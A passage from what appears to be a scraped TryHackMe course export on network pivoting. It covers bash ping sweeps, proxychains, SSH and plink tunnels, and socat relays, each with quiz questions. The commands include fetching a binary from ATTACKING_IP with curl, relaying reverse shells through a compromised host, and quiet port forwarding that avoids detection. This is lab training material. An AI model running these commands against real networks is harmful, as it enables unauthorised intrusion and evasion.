/></p><p>This could be easily modified to search other network ranges -- including the Wreath network. </p><p>The above command generates a full list of numbers from 1 to 255 and loops through it. For each number, it sends one ICMP ping packet to <img style="width:200px;padding:20px;float:right" alt="Radar filler image" src="https://assets.tryhackme.com/additional/wreath-network/NzA0MWYzMzQ1.jpg" class="note-float-right" />192.168.1.x as a backgrounded job (meaning that each ping runs in parallel for speed), where i is the current number. Each response is searched for "bytes from" to see if the ping was successful. Only successful responses are shown.</p><p>The equivalent of this command in Powershell is unbearably slow, so it\'s better to find an alternative option where possible. It\'s relatively straight forward to write a simple network scanner in a language like C# (or a statically compiled scanner written in C/C++/Rust/etc), which can be compiled and used on the target. This, however, is outwith the scope of the Wreath network (although very simple beta examples can be found <a href="https://github.com/MuirlandOracle/C-Sharp-Port-Scan" target="_blank">here</a> for C#, or <a href="https://github.com/MuirlandOracle/CPP-Port-Scanner" target="_blank">here</a> for C++).</p><p>It\'s worth noting as well that you may encounter hosts which have firewalls blocking ICMP pings (Windows boxes frequently do this, for example). This is likely to be less of a problem when pivoting, however, as these firewalls (by default) often only apply to external traffic, meaning that anything sent through a compromised host on the network should be safe. It\'s worth keeping in mind, however.</p>If you suspect that a host is active but is blocking ICMP ping requests, you could also check some common ports using a tool like netcat.<p></p><p>Port scanning in bash can be done (ideally) entirely natively:</p><p><code>for i in {1..65535}; do (echo &gt; /dev/tcp/192.168.1.1/$i) &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo $i is open; done</code><br /></p><p>Bear in mind that this will take a <i>very</i> long time, however!</p><p>There are many other ways to perform enumeration using only the tools available on a system, so please experiment further and see what you can come up with!</p><p></p>', 'taskType': 'none', 'taskNo': 9, 'taskCreated': '2021-01-05T20:39:28.690Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What is the absolute path to the file containing DNS entries on Linux?<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>What is the absolute path to the hosts file on Windows?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background:rgba(178,178,178,.3);color:rgba(255,255,255,0.85)">Pivoting</span> Proxychains &amp; Foxyproxy', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/vqLbUWpp1Hs" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>In this task we\'ll be looking at two "proxy" tools: Proxychains and FoxyProxy. These both allow us to connect through one of the proxies we\'ll learn about in the upcoming tasks. When creating a proxy we open up a port on our own attacking machine which is linked to the compromised server, giving us access to the target network. </p><p>Think of this as being something like a  tunnel created between a port on our attacking box that comes out inside  the target network -- like a secret tunnel from a fantasy story, hidden beneath the floorboards of the local bar and exiting in the palace treasure chamber. <br /></p><p>Proxychains and FoxyProxy can be used to direct our traffic through this port and into our target network.</p><hr /><p><b><u><span style="font-size:18px">Proxychains</span></u></b><br /></p><p>Proxychains is a tool we have already briefly mentioned in previous tasks. It\'s a very useful tool -- although not without its drawbacks. Proxychains can often slow down a connection: performing an nmap scan through it is especially hellish. Ideally you should try to use static tools where possible, and route traffic through proxychains only when required.</p><p>That said, let\'s take a look at the tool itself.</p><p>Proxychains is a command line tool which is activated by prepending the command <code>proxychains</code> to other commands. For example, to proxy netcat\xa0 through a proxy, you could use the command:<br /><code>proxychains nc 172.16.0.10 23</code><br /></p><p>Notice that a proxy port was not specified in the above command. This is because proxychains reads its options from a config file. The master config file is located at <code>/etc/proxychains.conf</code>. This is where proxychains will look by default; however, it\'s actually the last location where proxychains will look. The locations (in order) are:</p><ol><li>The current directory (i.e. <code>./proxychains.conf</code>)</li><li><code>~/.proxychains/proxychains.conf</code></li><li><code>/etc/proxychains.conf</code></li></ol><p>This makes it extremely easy to configure proxychains for a specific assignment, without altering the master file. Simply execute: <code>cp /etc/proxychains.conf .</code>, then make any changes to the config file in a copy stored in your current directory. If you\'re likely to move directories a lot then you could instead place it in a <code>.proxychains</code> directory under your home directory, achieving the same results. If you happen to lose or destroy the original master copy of the proxychains config, a replacement can be downloaded from <a href="https://raw.githubusercontent.com/haad/proxychains/master/src/proxychains.conf" target="_blank">here</a>.<br /></p><p>Speaking of the <code>proxychains.conf</code> file, there is only one section of particular use to us at this moment of time: right at the bottom of the file are the servers used by the proxy. You can set more than one server here to chain proxies together, however, for the time being we will stick to one proxy:</p><p> <img style="width:738px" alt="Screenshot of the default proxychains configuration showing the [Proxylist] section" src="https://assets.tryhackme.com/additional/wreath-network/443c865e3ff3.png" /></p><p>Specifically, we are interested in the "ProxyList" section:<br /><code>[ProxyList]<br /># add proxy here ...<br /># meanwhile<br /># defaults set to "tor"<br />socks4\xa0 127.0.0.1 9050</code><br /></p><p>It is here that we can choose which port(s) to forward the connection through. By default there is one proxy set to localhost port 9050 -- this is the default port for a Tor entrypoint, should you choose to run one on your attacking machine. That said, it is not hugely useful to us. This should be changed to whichever (arbitrary) port is being used for the proxies we\'ll be setting up in the following tasks. <br /></p><p>There is one other line in the Proxychains configuration that is worth paying attention to, specifically related to the Proxy DNS settings:<br /><img style="width:368px" alt="Screenshot showing the proxy_dns line in the Proxychains config" src="https://assets.tryhackme.com/additional/wreath-network/3af17f6ddafc.png" /><br /></p><p>If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the <code>proxy_dns</code> line using a hashtag (<code>#</code>) at the start of the line before performing a scan through the proxy! <br /><img style="width:378px" alt=" Proxy_DNS line commented out with a hashtag" src="https://assets.tryhackme.com/additional/wreath-network/557437aec525.png" /><br /></p><p>Other things to note when scanning through proxychains:</p><ul><li>You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packets (Ping requests) will also not work through the proxy, so use the\xa0 <code>-Pn</code>\xa0 switch to prevent Nmap from trying it.</li><li>It will be <i>extremely</i> slow. Try to only use Nmap through a proxy when using the NSE (i.e. use a static binary to see where the open ports/hosts are before proxying a local copy of nmap to use the scripts library).<br /></li></ul><hr /><p><u><b><span style="font-size:18px">FoxyProxy</span></b></u></p><p>Proxychains is an acceptable option when working with CLI tools, but if working in a web browser to access a webapp through a proxy, there is a better option available, namely: FoxyProxy!</p><p>People frequently use this tool to manage their BurpSuite/ZAP proxy quickly and easily, but it can also be used alongside the tools we\'ll be looking at in subsequent tasks in order to access web apps on an internal network. FoxyProxy is a browser extension which is available for <a href="https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-basic/" target="_blank">Firefox</a> and <a href="https://chrome.google.com/webstore/detail/foxyproxy-basic/dookpfaalaaappcdneeahomimbllocnb" target="_blank">Chrome</a>. There are two versions of FoxyProxy available: Basic and Standard. Basic works perfectly for our purposes, but feel free to experiment with standard if you wish. </p><p>After installing the extension in your browser of choice, click on it in your toolbar:<br /><img style="width:376px" alt="FoxyProxy Options button" src="https://assets.tryhackme.com/additional/wreath-network/c22f2ef3d6fc.png" /></p><p>Click on the "Options" button. This will take you to a page where you can configure your saved proxies. Click "Add" on the left hand side of the screen:<br /><img style="width:418px" alt="Highlighting the add button on the left hand side of the options menu" src="https://assets.tryhackme.com/additional/wreath-network/92e3cabe22e8.png" /></p><p>Fill in the IP and Port on the right hand side of the page that appears, then give it a name. Set the proxy type to the kind of proxy you will be using. SOCKS4 is usually a good bet, although Chisel (which we will cover in a later task) requires SOCKS5. An example config is given here:<img style="width:1076px" alt="Example config showing SOCKS4, 127.0.0.1 and 1337 as the respective options" src="https://assets.tryhackme.com/additional/wreath-network/19436164d15e.png" /><br /></p><p>Press Save, then click on the icon in the task bar again to bring up the proxy menu. You can switch between any of your saved proxies by clicking on them:<br /><img style="width:375px" alt="Highlighting how to switch proxies" src="https://assets.tryhackme.com/additional/wreath-network/1d91c2b6a625.png" /></p><p>Once activated, all of your browser traffic will be redirected through the chosen port (so make sure the proxy is active!). Be aware that if the target network doesn\'t have internet access (like all TryHackMe boxes) then you will not be able to access the outside internet when the proxy is activated. Even in a real engagement, routing your general internet searches through a client\'s network is unwise anyway, so turning the proxy off (or using the routing features in FoxyProxy standard) for everything other than interaction with the target network is advised.</p><p>With the proxy activated, you can simply navigate to the target domain or IP in your browser and the proxy will take care of the rest!<br /></p>', 'taskType': 'none', 'taskNo': 10, 'taskCreated': '2021-01-06T18:32:21.628Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?<br />', 'hint': 'Use spaces between the values, not tabs.'}, {'questionNo': 2, 'question': '<p>What command would you use to telnet through a proxy to 172.16.0.100:23?<br /></p>', 'hint': 'The port is not strictly necessary here as it is the standard port for telnet connections; however, it is added here as an example.'}, {'questionNo': 3, 'question': '<p>You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background:rgba(178,178,178,.3);color:rgba(255,255,255,0.85)">Pivoting</span> SSH Tunnelling / Port Forwarding', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/CiW2zPPwfiQ" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>The first tool we\'ll be looking at is none other than the bog-standard SSH client with an OpenSSH server. Using these simple tools, it\'s possible to create both forward and reverse connections to make SSH "tunnels", allowing us to forward ports, and/or create proxies.</p><hr /><b><u><span style="font-size:18px">Forward Connections</span></u></b><p></p><p>Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target. As such, this technique is much more commonly used against Unix hosts. Linux servers, in particular, commonly have SSH active and open. That said, Microsoft (relatively) recently brought out their own implementation of the OpenSSH server, native to Windows, so this technique may begin to get more popular in this regard if the feature were to gain more traction.</p><p>There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.</p><ul><li>Port forwarding is accomplished with the <code>-L</code> switch, which creates a link to a <b>L</b>ocal port. For example, if we had SSH access to 172.16.0.5 and there\'s a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:<br /><code>ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN</code><br />We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 <i>on our own</i> <i>attacking machine.</i> For example, by entering <code>localhost:8000</code> into a web browser. Using this technique we have effectively created a tunnel between port 80 on the target server, and port 8000 on our own box. Note that it\'s good practice to use a high port, out of the way, for the local connection. This means that the low ports are still open for their correct use (e.g. if we wanted to start our own webserver to serve an exploit to a target), and also means that we do not need to use <code>sudo</code> to create the connection. The <code>-fN</code> combined switch does two things: <code>-f</code> backgrounds the shell immediately so that we have our own terminal back. <code>-N</code> tells SSH that it doesn\'t need to execute any commands -- only set up the connection.<br /><br /></li><li>Proxies are made using the <code>-D</code> switch, for example: <code>-D 1337</code>. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:<br /><code>ssh -D 1337 user@172.16.0.5 -fN</code><br />This again uses the <code>-fN</code> switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.<br /></li></ul><p><br /></p><hr /><p><u><b><span style="font-size:18px">Reverse Connections</span></b></u><br /></p><p>Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine <i>from</i> the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse connection safely, there are a few steps we need to take:</p><ol><li>First, generate a new set of SSH keys and store them somewhere safe (<code>ssh-keygen</code>):<br /><img style="width:629px" alt="ssh-keygen process" src="https://assets.tryhackme.com/additional/wreath-network/62b2e09ba985.png" /><br /><br />This will create two new files: a private key, and a public key.<br /><br /></li><li>Copy the contents of the public key (the file ending with <code>.pub</code>), then edit the <code>~/.ssh/authorized_keys</code> file on your own attacking machine. You may need to create the <code>~/.ssh</code> directory and <code>authorized_keys</code> file first.</li><li>On a new line, type the following line, then paste in the public key:<br /><code>command="echo \'This account can only be used for port forwarding\'",no-agent-forwarding,no-x11-forwarding,no-pty</code><br />This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.</li></ol><p>The final entry in the <code>authorized_keys</code> file should look something like this:</p><p><img style="width:955px" alt="The syntax shown above, in place within the file" src="https://assets.tryhackme.com/additional/wreath-network/055753470a05.png" /><br /></p><p>Next. check if the SSH server on your attacking machine is running:<br /><code>sudo systemctl status ssh</code></p><p>If the service is running then you should get a response that looks like this (with "active" shown in the message):<br /><img style="width:712px" alt="systemctl output when checking SSH is active. You should see active (running) in the output" src="https://assets.tryhackme.com/additional/wreath-network/08746aa1021e.png" /><br /></p><p>If the status command indicates that the server is not running then you can start the ssh service with:<br /><code>sudo systemctl start ssh</code></p><p>The only thing left is to do the unthinkable: transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.</p><p>With the key transferred, we can then connect back with a reverse port forward using the following command:<br /><code>ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN<br /></code></p><p>To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:<br /><code>ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN<br /></code></p><p>This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!</p><p>In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the <code>-D</code> switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:<br /><code>ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN</code><br /></p><p>This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.</p><p><i><b>Note:</b> Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in Windows systems, even if there is not an SSH server running on the Windows system we\'re connecting back from. In many ways this makes the next task covering plink.exe redundant; however, it is still very relevant for older systems.</i><br /></p><hr /><p>To close any of these connections, type <code>ps aux | grep ssh</code> into the terminal of the machine that created the connection:</p><p><img style="width:1006px" alt="Highlighting the process id of the ssh proxy/port forward" src="https://assets.tryhackme.com/additional/wreath-network/daf8fd5c8540.png" /></p><p>Find the process ID (PID) of the connection. In the above image this is 105238.</p><p>Finally, type <code>sudo kill PID</code> to close the connection:</p><p><img style="width:990px" alt="Killing the connection, demonstrating that the connection is now terminated" src="https://assets.tryhackme.com/additional/wreath-network/dc4393e7991e.png" /><br /></p>', 'taskType': 'none', 'taskNo': 11, 'taskCreated': '2021-01-06T00:27:42.366Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "If you're connecting to an SSH server <i>from</i> your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?<br />", 'hint': ''}, {'questionNo': 2, 'question': '<p>Which switch combination can be used to background an SSH port forward or tunnel?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': "<p>It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?<br /></p>", 'hint': ''}, {'questionNo': 4, 'question': '<p>What command would you use to create a pair of throwaway SSH keys for a reverse connection?<br /></p>', 'hint': ''}, {'questionNo': 5, 'question': '<p>If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called <code>id_rsa</code> and backgrounding the shell, what command would you use? (Assume your username is "kali")<br /></p>', 'hint': ''}, {'questionNo': 6, 'question': '<p>What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?<br /></p>', 'hint': ''}, {'questionNo': 7, 'question': '<p>If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background:rgba(178,178,178,.3);color:rgba(255,255,255,0.85)">Pivoting</span> plink.exe', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/MSxRNTU4bUQ" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Plink.exe is a Windows command line version of the PuTTY SSH client. Now that Windows comes with its own inbuilt SSH client, plink is less useful for modern servers; however, it is still a very useful tool, so we will cover it here.</p><p>Generally speaking, Windows servers are unlikely to have an SSH server running so our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection. This would be done with the following command:<br /><code>cmd.exe /c echo y | .\\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N</code><br /></p><p>Notice that this syntax is nearly identical to previously when using the standard OpenSSH client. The <code>cmd.exe /c echo y</code> at the start is for non-interactive shells (like most reverse shells -- with Windows shells being difficult to stabilise), in order to get around the warning message that the target has not connected to this host before. </p><p>To use our example from before, if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this command:<br /><code>cmd.exe /c echo y | .\\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N</code></p><p>Note that any keys generated by <code>ssh-keygen</code> will not work properly here. You will need to convert them using the <code>puttygen</code> tool, which can be installed on Kali using <code>sudo apt install putty-tools</code>. After downloading the tool, conversion can be done with:<br /><code>puttygen KEYFILE -o OUTPUT_KEY.ppk</code><br />Substituting in a valid file for the keyfile, and adding in the output file.<br /></p><p>The resulting <code>.ppk</code> file can then be transferred to the Windows target and used in exactly the same way as with the Reverse port forwarding taught in the previous task (despite the private key being converted, it will still work perfectly with the same public key we added to the authorized_keys file before).<br /></p><p><i><b>Note:</b> Plink is notorious for going out of date quickly, which often results in failing to connect back. Always make sure you have an up to date version of the </i><code>.exe</code><i>. Whilst there is a copy pre-installed on Kali at </i><code>/usr/share/windows-resources/binaries/plink.exe</code><i>, downloading a new copy from <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html" target="_blank">here</a> before a new engagement is sensible.</i><br /></p>', 'taskType': 'none', 'taskNo': 12, 'taskCreated': '2021-01-06T17:27:21.732Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What tool can be used to convert OpenSSH keys into PuTTY style keys?<br />', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background:rgba(178,178,178,.3);color:rgba(255,255,255,0.85)">Pivoting</span> Socat', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/ydmlsRCQiIE" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Socat is not just great for fully stable Linux shells<sup><a href="https://tryhackme.com/room/introtoshells" target="_blank">[1]</a></sup>, it\'s also superb for port forwarding. The one big disadvantage of socat (aside from the frequent problems \npeople have learning the syntax), is that it is very rarely installed by\n default on a target. That said, static binaries are easy to find for \nboth <a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" target="_blank">Linux</a> and <a href="https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download" target="_blank">Windows</a>.\n Bear in mind that the Windows version is unlikely to bypass Antivirus \nsoftware by default, so custom compilation may be required. Before we begin, it\'s worth noting: if you have completed the <a href="https://tryhackme.com/room/introtoshells" target="_blank">What the Shell?</a> room, you will know that socat can be used to create encrypted connections. The techniques shown here could be combined with the encryption options detailed in the shells room to create encrypted port forwards and relays. To avoid overly complicating this section, this technique will not be taught here; however, it\'s well worth experimenting with this in your own time.<br /></p><p>Whilst the following techniques could not be used to set up a full proxy into a target network, it is quite possible to use them to successfully forward ports from both Linux and Windows compromised targets. In particular, socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:</p><p><img style="width:75%" alt="Diagram demonstrating the purpose of a relay to forward a shell back from a target PC" src="https://assets.tryhackme.com/additional/wreath-network/502e2fa5765e.png" /><br /></p><p>It\'s best to think of socat as a way to join two things together -- kind of like the Portal Gun in the Portal games, it creates a link between two different locations. This could be two ports on the same machine, it could be to create a relay between two different machines, it could be to create a connection between a port and a file on the listening machine, or many other similar things. It is an extremely powerful tool, which is well worth looking into in your own time.</p><p>Generally speaking, however, hackers tend to use it to either create reverse/bind shells, or, as in the example above, create a port forward. Specifically, in the above example we\'re creating a port forward <i>from</i> a port on the compromised server <i>to</i> a listening port on our own box. We could do this the other way though, by either forwarding a connection from the attacking machine to a target inside the network, or creating a direct link between a listening port on the <i>attacking machine</i> with the service on the internal server. This latter application is especially useful as it does not require opening a port on the compromised server.</p><p>Before using socat, it will usually be necessary to download a binary for it, then upload it to the box. </p><p><b>For example, with a Python webserver:-</b></p><p>On Kali (inside the directory containing your Socat binary):</p><p><code>sudo python3 -m http.server 80</code></p><p>Then, on the target:<br /><code>curl ATTACKING_IP/socat -o /tmp/socat-USERNAME &amp;&amp; chmod +x /tmp/socat-USERNAME</code></p><p><img style="width:665px" alt="Demonstration of using cURL with a Python HTTP server to upload files" src="https://assets.tryhackme.com/additional/wreath-network/f976be91162d.png" /></p><p>With the binary uploaded, let\'s have a look at each of the above scenarios in turn.</p><p><i><b>Note: </b>This uploads the socat binary with your username in the title; however, the example commands given in the rest of this task will refer to the binary simply as </i><code>socat</code><i>.</i><br /></p><hr /><p><u><b><span style="font-size:18px">Reverse Shell Relay</span></b></u></p><p>In this scenario we are using socat to create a relay for us to send a reverse shell back to our own attacking machine (as in the diagram above). First let\'s start a standard netcat listener on our attacking box (<code>sudo nc -lvnp 443</code>). Next, on the compromised server, use the following command to start the relay:<br /><code>./socat tcp-l:8000 tcp:ATTACKING_IP:443 &amp;<br /></code></p><p><i><b>Note:</b> the order of the two addresses matters here. Make sure to open the listening port first, </i>then<i> connect back to the attacking machine.</i><br /></p><p>From here we can then create a reverse shell to the newly opened port 8000 on the compromised server. This is demonstrated in the following screenshot, using netcat on the remote server to simulate receiving a reverse shell from the target server:</p><p><img style="width:849px" alt="Demonstration of a socat reverse shell relay from the compromised target to the attacking machine using netcat to simulate sending a shell" src="https://assets.tryhackme.com/additional/wreath-network/e8740afb79ab.png" /></p><p>A brief explanation of the above command:</p><ul><li><code>tcp-l:8000</code> is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.</li><li><code>tcp:ATTACKING_IP:443</code> connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.</li><li><code>&amp;</code> backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.</li></ul><p>The relay connects back to a listener started using an alias to a standard netcat listener: <code>sudo nc -lvnp 443</code>.<br /></p><p>In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. This technique can also be chained quite easily; however, in many cases it may be easier to just upload a static copy of netcat to receive your reverse shell directly on the compromised server.</p><hr /><p><u><b><span style="font-size:18px">Port Forwarding -- Easy</span></b></u></p><p><img style="margin:20px;height:200px;float:right;transform:scaleX(-1)" src="https://assets.tryhackme.com/additional/wreath-network/YzM2ZWVlOGU5.png" class="note-float-right" />The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:<br /><code>./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &amp;<br /></code></p><p>This opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of 172.16.0.10. The <code>fork</code> option is used to put every connection into a new process, and the <code>reuseaddr</code> option means that the port stays open after a connection is made to it. Combined, they allow us to use the same port forward for more than one connection. Once again we use <code>&amp;</code> to background the shell, allowing us to keep using the same terminal session on the compromised server for other things.</p><p>We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.</p><hr /><p><u><b><span style="font-size:18px">Port Forwarding -- Quiet</span></b></u></p><p>The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not <i>massive</i>, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn\'t require opening up a port externally on the compromised server.</p><p>First of all, on our own attacking machine, we issue the following command:<br /><code>socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &amp;</code></p><p>This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the <code>fork</code> and <code>reuseaddr</code> options set, to allow us to create more than one connection using this port forward.</p><p>Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:<br /><code>./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &amp;<br /></code></p><p>This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:<br /><code>./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &amp;<br /></code></p><p>This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to <code>localhost:8000</code> in our attacking machine\'s web browser  to load the webpage served by the target: 172.16.0.10:80!</p><p>This is quite a complex scenario to visualise, so let\'s quickly run through what happens when you try to access the webpage in your browser:</p><img style="height:200px;margin:20px;float:right" src="https://assets.tryhackme.com/additional/wreath-network/ZjA0YmEzMzVl.png" class="note-float-right" /><ul><li>The request goes to <code>127.0.0.1:8000</code></li><li>Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001</li><li>Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.</li></ul><p>The process is then reversed when the target sends the response:</p><ul><li>The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.</li><li>Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.</li></ul><p>We have now achieved the same thing as previously, but without opening any ports on the server!<br /></p><hr /><p>Finally, we\'ve learnt how to <i>create</i> backgrounded socat port forwards and relays, but it\'s important to also know how to <i>close</i> these. The solution is simple: run the <code>jobs</code> command in your terminal, then kill any socat processes using <code>kill %NUMBER</code>:</p><p><img style="width:646px" alt="Demonstration for how to kill background jobs" src="https://assets.tryhackme.com/additional/wreath-network/61ca87aa4350.png" /><span style="background-color:rgb(255, 255, 0)"><br /></span></p><hr /><p><b>For the following questions, assume that we are working with a local copy of socat called <code>socat</code> in the current directory. </b><br /><span style="background-color:rgb(255, 255, 0)"></span></p><hr /><p><a href="https://tryhackme.com/room/introtoshells" target="_blank">[1] TryHackme: What The Shell?</a><br /></p>', 'taskType': 'none', 'taskNo': 13, 'taskCreated': '2021-01-06T20:04:03.187Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Which socat option allows you to reuse the same listening port for more than one connection?<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory? </p><p>Use TCP port 8000 for the server listener, and <b>do not</b> background the process.<br /></p>', 'hint': './socat tcp-l:LISTEN_PORT tcp:ATTACKING_IP:ATTACKING_PORT'}, {'questionNo': 3, 'question': '<p>What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?<br /></p>', 'hint': 'Remember to add the fork and reuseaddr options!'}, {'questionNo': 4, 'question': '<p><b>Bonus Question (Optional): </b>Try to create an encrypted port forward or relay using the <code>OPENSSL</code> options in socat. Task 7 of the <a href="https://tryhackme.com/room/introtoshells" target="_blank">shells</a> room may help with this.<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background:rgba(178,178,178,.3);color:rgba(255,255,255,0.85)">Pivoting</span> Chisel', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/6lG2JnmxI_g" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p><a href="https://github.com/jpillora/chisel" target="_blank">Chisel</a> is an awesome tool which can be used to quickly and easily set up 